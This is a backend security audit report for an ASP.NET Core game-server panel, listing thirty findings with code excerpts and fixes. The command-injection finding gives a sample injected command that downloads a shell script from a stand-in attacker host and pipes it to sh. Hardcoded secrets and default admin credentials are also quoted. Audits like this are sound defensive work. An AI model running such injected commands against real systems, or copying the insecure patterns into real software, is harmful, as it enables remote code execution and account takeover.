# Backend Audit Report

**Date:** March 1, 2026  
**Scope:** `backend/ServerPanel.API/` — all controllers, services, models, DTOs, configuration, and Dockerfile  
**Framework:** ASP.NET Core 9.0 / Entity Framework Core 9.0 / Docker.DotNet

---

## Summary

| Severity     | Count | Key Areas                                                    |
|--------------|-------|--------------------------------------------------------------|
| **Critical** | 9     | Auth bypass, secrets in source, command injection, missing auth |
| **High**     | 7     | No brute-force protection, token leakage, no resource caps   |
| **Medium**   | 8     | No pagination, swallowed exceptions, no HTTPS, CORS          |
| **Low**      | 6     | Code organization, type mismatches, naming                   |

---

## CRITICAL

### 1. Hardcoded JWT Secret Fallback

**Files:** `Program.cs:70`, `Services/AuthService.cs:139`

Both locations contain an identical hardcoded fallback JWT key:

```csharp
var jwtKey = builder.Configuration["Jwt:Key"] ?? "SuperSecretKeyForJWT2025!@#$%^&*()";
```

If the configuration value is ever missing or the environment variable is unset, the application silently falls back to a publicly-known key, allowing any attacker to forge valid JWT tokens and impersonate any user including SuperAdmin.

**Recommendation:** Remove the fallback entirely. Throw a startup exception if the key is not configured. Use `builder.Configuration["Jwt:Key"] ?? throw new InvalidOperationException("JWT Key must be configured")`.

---

### 2. Hardcoded Default Admin Credentials

**File:** `Program.cs:113-123`

A seed user `admin / admin123` is created at startup with `SuperAdmin` role, and the credentials are printed to stdout:

```csharp
PasswordHash = BCrypt.Net.BCrypt.HashPassword("admin123"),
// ...
Console.WriteLine("Admin user created: admin / admin123");
```

There is no forced password rotation, no first-login flag, and no secure bootstrapping flow.

**Recommendation:** Generate a random password at first startup, display it once, and force a password change on first login. Alternatively, use an environment variable for the initial admin password.

---

### 3. Plaintext Database Password in Committed Config

**File:** `appsettings.json:10`

```json
"DefaultConnection": "Server=sqlserver;Database=ArcadeNode;User Id=sa;Password=<REDACTED>;TrustServerCertificate=True;"
```

The SA password is committed in plain text to source control.

**Recommendation:** Use environment variables or a secrets manager (Azure Key Vault, Docker secrets, `dotnet user-secrets`). Never commit connection strings with credentials.

---

### 4. Plaintext JWT Key in Committed Config

**File:** `appsettings.json:13`

```json
"Key": "ArcadeNode!GameServer@SecureKey2026#$%^&*()"
```

The JWT signing key is committed in plain text.

**Recommendation:** Inject via environment variable. Remove from `appsettings.json` and add it to `.gitignore` or use `appsettings.Development.json` with `.gitignore`.

---

### 5. Open Registration — No Rate Limiting or CAPTCHA

**File:** `Controllers/AuthController.cs:40-50`

`POST /api/auth/register` is open to anonymous users with:
- No rate limiting
- No CAPTCHA
- No email verification
- No admin approval flow

An attacker can mass-create accounts via automated requests.

**Recommendation:** Add rate limiting middleware (e.g., `AspNetCoreRateLimit` or .NET 7+ built-in rate limiter). Require email verification. Optionally require an invite code or admin approval.

---

### 6. `DeploymentController` Endpoints Missing `[Authorize]`

**File:** `Controllers/DeploymentController.cs:11-12`

The controller class itself has **no** `[Authorize]` attribute. The following endpoints are fully unauthenticated:

| Endpoint | Risk |
|----------|------|
| `GET /api/deployment/templates` | Leaks all game template info including Docker images |
| `GET /api/deployment/templates/{id}` | Leaks specific template details |
| `GET /api/deployment/templates/category/{category}` | Leaks templates by category |
| `GET /api/deployment/templates/{id}/recommendations` | Leaks infrastructure recommendations |

**Recommendation:** Add `[Authorize]` at the controller level or on each public endpoint.

---

### 7. `AdminController.GetAllEggs` Marked `[AllowAnonymous]`

**File:** `Controllers/AdminController.cs:133`

```csharp
[HttpGet("eggs")]
[AllowAnonymous]  // <-- overrides controller-level [Authorize(Roles = "Admin,SuperAdmin")]
public async Task<IActionResult> GetAllEggs()
```

This exposes Docker image names and startup commands (including variable templates) to any unauthenticated user.

**Recommendation:** Remove `[AllowAnonymous]`. If non-admin users need egg data, create a separate public endpoint with filtered/sanitized output.

---

### 8. Command Injection via `SendCommandAsync`

**File:** `Services/DockerService.cs:330-344`

User-provided command text is passed directly to a shell:

```csharp
Cmd = new[] { "/bin/sh", "-c", command }
```

No sanitization, no allow-listing, no escaping. A user with server access can inject arbitrary shell commands into the container (e.g., `stop; curl attacker.com/shell.sh | sh`), potentially leading to container escape.

**Recommendation:** Implement a command allow-list per game type. At minimum, escape shell metacharacters. Consider using Docker's stdin attach instead of `exec` with `/bin/sh -c`.

---

### 9. Docker API Over Unencrypted TCP

**File:** `appsettings.json:17`

```json
"NodeUrl": "http://node:2375"
```

The Docker daemon is accessed over unencrypted HTTP without TLS client certificates. Anyone with network access to port 2375 can control all containers — create, delete, exec into, and mount host filesystems.

**Recommendation:** Enable Docker TLS and use client certificates. Use `https://` with proper cert validation. Alternatively, use Unix sockets if on the same host.

---

## HIGH

### 10. No Password Complexity Enforcement

**Files:** `DTOs/DTOs.cs:17`, `Controllers/AuthController.cs:116`

Registration only requires `[MinLength(8)]`:

```csharp
public record RegisterRequest(
    [Required][MaxLength(100)] string Username,
    [Required][EmailAddress] string Email,
    [Required][MinLength(8)] string Password,  // No complexity rules
    ...
);
```

`ChangePasswordRequest` has **zero** validation on `NewPassword`:

```csharp
public record ChangePasswordRequest(string CurrentPassword, string NewPassword);
```

**Recommendation:** Add a custom validation attribute or FluentValidation rule requiring uppercase, lowercase, digit, and special character. Apply the same rules to `ChangePasswordRequest.NewPassword`.

---

### 11. No Account Lockout After Failed Login Attempts

**File:** `Services/AuthService.cs:24-36`

The `LoginAsync` method performs password verification with no tracking of failed attempts:

```csharp
if (user == null || !BCrypt.Net.BCrypt.Verify(request.Password, user.PasswordHash))
    return null;
```

Unlimited brute-force attacks are possible against any known username.

**Recommendation:** Track failed login attempts per user. Lock accounts after N failures (e.g., 5) for a configurable duration. Log failed attempts with IP address for monitoring.

---

### 12. `DaemonToken` Exposed in Node DTOs

**File:** `Services/NodeService.cs:296`

`NodeDto` includes `DaemonToken` and is returned to any Admin user:

```csharp
private static NodeDto MapToDto(Node node) => new(
    // ...
    node.DaemonToken,  // secret token included in API response
    // ...
);
```

**Recommendation:** Create a separate `NodeSummaryDto` without `DaemonToken` for list/detail endpoints. Only expose the token in a dedicated secure endpoint (e.g., `GET /api/nodes/{id}/token`) with SuperAdmin restriction.

---

### 13. No Resource Limit Validation on Server Creation

**Files:** `DTOs/DTOs.cs:40-53`, `Services/ServerService.cs:72-109`

`CreateServerRequest` has no `[Range]` validation on resource limits:

```csharp
int MemoryLimit = 1024,  // No max
int CpuLimit = 100,      // No max
int DiskLimit = 10240,   // No max
```

The service layer also does not validate against the node's available capacity. A malicious admin could:
- Allocate `int.MaxValue` MB of memory
- Overcommit a node far beyond its physical resources

**Recommendation:** Add `[Range]` attributes with sensible maximums. In `ServerService.CreateServerAsync`, validate against the node's `TotalMemory - AllocatedMemory` and `TotalDisk - AllocatedDisk` (accounting for overallocation percentages).

---

### 14. Insecure Password Generation

**File:** `Controllers/DeploymentController.cs:254-258`

```csharp
private static string GeneratePassword(int length)
{
    const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    var random = new Random();  // NOT cryptographically secure
    return new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
}
```

`System.Random` is not cryptographically secure and can be predicted. No special characters are included.

**Recommendation:** Use `System.Security.Cryptography.RandomNumberGenerator`:

```csharp
private static string GeneratePassword(int length)
{
    const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*";
    return new string(Enumerable.Range(0, length)
        .Select(_ => chars[RandomNumberGenerator.GetInt32(chars.Length)])
        .ToArray());
}
```

---

### 15. Docker Image Pull Without Validation

**File:** `Services/DockerService.cs:103-110`

```csharp
await _dockerClient.Images.CreateImageAsync(
    new ImagesCreateParameters { FromImage = server.DockerImage },
    null,
    new Progress<JSONMessage>());
```

Any Docker image name is accepted and pulled without restriction. A malicious image name like `evil.registry.com/malware:latest` would be pulled and executed.

**Recommendation:** Maintain an allow-list of approved registries and image prefixes. Validate `server.DockerImage` against the allow-list before pulling.

---

### 16. `DockerService` Registered as Singleton With Shared `DockerClient`

**File:** `Program.cs:89`

```csharp
builder.Services.AddScoped<IDockerService, DockerService>();
```

> Note: Upon re-review this is `AddScoped`, not `AddSingleton`. However, the `DockerClient` is created in the constructor based on a single config URL. If different nodes have different Docker endpoints, a single scoped `DockerClient` per request will not work for multi-node management. The `DockerClient` is also not disposed properly.

**Recommendation:** Create `DockerClient` instances per-node using a factory pattern. Ensure proper disposal via `IDisposable` implementation.

---

## MEDIUM

### 17. `EnsureCreated()` Instead of Migrations

**File:** `Program.cs:107`

```csharp
db.Database.EnsureCreated();
```

`EnsureCreated()` creates the database if it doesn't exist but:
- Does NOT apply migrations
- Will silently skip schema changes after the first run
- Cannot be used alongside migrations

**Recommendation:** Switch to `db.Database.Migrate()` and use EF Core migrations for schema management.

---

### 18. No Pagination on List Endpoints

**Files:** `Controllers/AdminController.cs:60-66`, `Controllers/ServersController.cs:30-45`, `Services/NodeService.cs:22-29`

Multiple endpoints return unbounded result sets:

| Endpoint | Method |
|----------|--------|
| `GET /api/admin/users` | `GetAllUsersAsync()` → `.ToListAsync()` |
| `GET /api/servers` | `GetAllServersAsync()` → `.ToListAsync()` |
| `GET /api/nodes` | `GetAllNodesAsync()` → `.ToListAsync()` |

At scale, these will return thousands of records, causing memory pressure and slow responses.

**Recommendation:** Add `[FromQuery] int page = 1, [FromQuery] int pageSize = 25` parameters. Implement `.Skip()` / `.Take()` in queries. Return total count in response headers or wrapper object.

---

### 19. Swallowed Exceptions Throughout

**Files:** `Services/DockerService.cs` (multiple locations), `Services/ServerService.cs:104-108`

Multiple `catch` blocks silently swallow exceptions:

```csharp
catch { return false; }
catch { /* Image might already exist locally */ }
```

These hide:
- Docker connectivity failures
- Image pull failures
- Container creation errors
- Permission issues

**Recommendation:** Log all exceptions at minimum. Use structured logging with exception details:

```csharp
catch (Exception ex)
{
    _logger.LogError(ex, "Failed to start container {ContainerId}", containerId);
    return false;
}
```

---

### 20. No HTTPS Enforcement

**File:** `Program.cs:99-106`

The HTTP pipeline has no HTTPS enforcement:

```csharp
// Missing:
// app.UseHttpsRedirection();
// app.UseHsts();
```

The API will happily serve over plain HTTP in production, including JWT tokens and passwords.

**Recommendation:** Add `app.UseHttpsRedirection()` and configure HSTS for production environments.

---

### 21. CORS Policy Too Permissive for Production

**File:** `Program.cs:93-99`

```csharp
policy.WithOrigins("http://localhost:3000", "http://frontend:80")
      .AllowAnyMethod()
      .AllowAnyHeader()
      .AllowCredentials();
```

- `AllowAnyMethod()` permits DELETE, PATCH, etc. even if unused
- `AllowAnyHeader()` allows arbitrary headers
- Origins are hardcoded HTTP (not HTTPS)

**Recommendation:** Restrict to specific methods (`GET`, `POST`, `PUT`, `DELETE`) and headers (`Content-Type`, `Authorization`). Make origins configurable via environment config. Use HTTPS origins in production.

---

### 22. Profile Update Allows Unvalidated Email

**File:** `Services/AuthService.cs:99-112`

```csharp
public async Task<bool> UpdateUserAsync(Guid id, string? firstName, string? lastName, string? email)
```

The `UpdateProfileRequest` record (`AuthController.cs:115`) has no validation attributes:

```csharp
public record UpdateProfileRequest(string? FirstName, string? LastName, string? Email);
```

An invalid email like `"not-an-email"` would be saved to the database. The `User` model has `[EmailAddress]` but this is only enforced at the database/model level, not at the API input level.

**Recommendation:** Add `[EmailAddress]` to `UpdateProfileRequest.Email`. Add `[MaxLength]` constraints matching the model.

---

### 23. `ServerByIdentifier` Endpoint — No Input Validation

**File:** `Controllers/ServersController.cs:66-75`

```csharp
[HttpGet("identifier/{identifier}")]
public async Task<IActionResult> GetServerByIdentifier(string identifier)
```

The `identifier` parameter accepts any string with no length limit, format constraint, or regex route constraint. The identifier is an 8-character hex string, but this isn't enforced.

**Recommendation:** Add a route constraint: `{identifier:length(8)}` or `{identifier:regex(^[a-f0-9]{{8}}$)}`. Add `[MaxLength(8)]` parameter validation.

---

### 24. Synchronous Methods in Cartridges Controller

**File:** `Controllers/CartridgesController.cs:28-41`

`GetAll()`, `GetById()`, `GetByCategory()` are synchronous, returning `ActionResult<T>` instead of `Task<ActionResult<T>>`. While the underlying `CartridgeService` operates in-memory, this blocks the request thread and is inconsistent with the async pattern used everywhere else.

**Recommendation:** Either make these `async` for consistency, or document the intentional synchronous design. For in-memory operations, synchronous is acceptable but should be explicit.

---

## LOW

### 25. `GameServer.Identifier` Generated at Property Init

**File:** `Models/GameServer.cs:18`

```csharp
public string Identifier { get; set; } = Guid.NewGuid().ToString("N")[..8];
```

The identifier is generated when the C# object is instantiated — including during EF Core deserialization, test fixtures, etc. This wastes entropy and can cause subtle bugs if the property isn't explicitly set.

**Recommendation:** Move identifier generation to the service layer or use a database default/computed column.

---

### 26. `AdditionalPorts` Type Mismatch

**File:** `Models/GameServer.cs:39`

```csharp
public int? AdditionalPorts { get; set; } // JSON array
```

The property is typed `int?` but the comment says "JSON array." This should be `string?` if it stores serialized JSON, matching the pattern used by `EnvironmentVariables`.

**Recommendation:** Change to `string? AdditionalPorts` or create a proper navigation property.

---

### 27. Inconsistent DTO Location

DTOs are scattered across multiple files:

| Location | DTOs Defined |
|----------|-------------|
| `DTOs/DTOs.cs` | Core DTOs (Auth, Server, Node, etc.) |
| `DTOs/DeploymentDTOs.cs` | Deployment-specific DTOs |
| `Controllers/CartridgesController.cs` | 15+ cartridge DTOs |
| `Controllers/AuthController.cs` | `UpdateProfileRequest`, `ChangePasswordRequest` |
| `Controllers/AdminController.cs` | `DashboardStats` |
| `Controllers/NodesController.cs` | `CreateAllocationBulkRequest` |

**Recommendation:** Consolidate all DTOs into the `DTOs/` directory. Create separate files per domain (e.g., `AuthDTOs.cs`, `ServerDTOs.cs`, `CartridgeDTOs.cs`).

---

### 28. `CartridgeService` and `GameTemplateService` Duplication

Both services define game server templates:

- **`GameTemplateService`** — hardcodes templates in C# code
- **`CartridgeService`** — loads templates from `cartridge.json` files on disk

They serve overlapping purposes with different data formats, creating confusion about which is the source of truth.

**Recommendation:** Unify into a single service. Consider migrating all hardcoded templates to `cartridge.json` files and deprecating `GameTemplateService`.

---

### 29. No Request Logging or Audit Trail

There is no middleware for:
- Request/response logging
- Audit trail for destructive operations (delete server, delete user, power actions)
- Tracking who performed admin operations and when

For a server management panel, this is a significant operational gap.

**Recommendation:** Add request logging middleware. Log all write operations (POST, PUT, DELETE) with user ID, timestamp, resource affected, and action type. Consider a dedicated `AuditLog` database table.

---

### 30. `PendingModelChangesWarning` Suppressed

**File:** `Data/PanelDbContext.cs:14-16`

```csharp
optionsBuilder.ConfigureWarnings(warnings => 
    warnings.Ignore(RelationalEventId.PendingModelChangesWarning));
```

This suppresses EF Core's warning that the code model differs from the last migration. This hides schema drift and can lead to runtime errors when the application tries to query columns that don't exist.

**Recommendation:** Remove the suppression. Create and apply proper migrations whenever the model changes.

---

## Remediation Priority

### Immediate (before any deployment)

1. **Move all secrets out of source control** — JWT key, DB password, admin credentials → environment variables or secrets manager
2. **Add `[Authorize]` to `DeploymentController`** and remove `[AllowAnonymous]` from admin eggs endpoint
3. **Sanitize commands** in `SendCommandAsync` — implement allow-listing per game type
4. **Enable TLS** on Docker daemon communication
5. **Remove hardcoded fallback JWT key** — fail fast if not configured

### Short-term (next sprint)

6. Add rate limiting to login and registration endpoints
7. Implement account lockout after failed login attempts
8. Add resource limit validation against node capacity
9. Remove `DaemonToken` from `NodeDto` API responses
10. Replace `EnsureCreated()` with `Database.Migrate()`
11. Add HTTPS enforcement and HSTS

### Medium-term (next release)

12. Add pagination to all list endpoints
13. Add structured exception handling (stop swallowing exceptions)
14. Implement request/response audit logging
15. Unify `CartridgeService` and `GameTemplateService`
16. Consolidate DTO locations
17. Validate Docker image names against allow-list

---

*Report generated by code audit on March 1, 2026.*
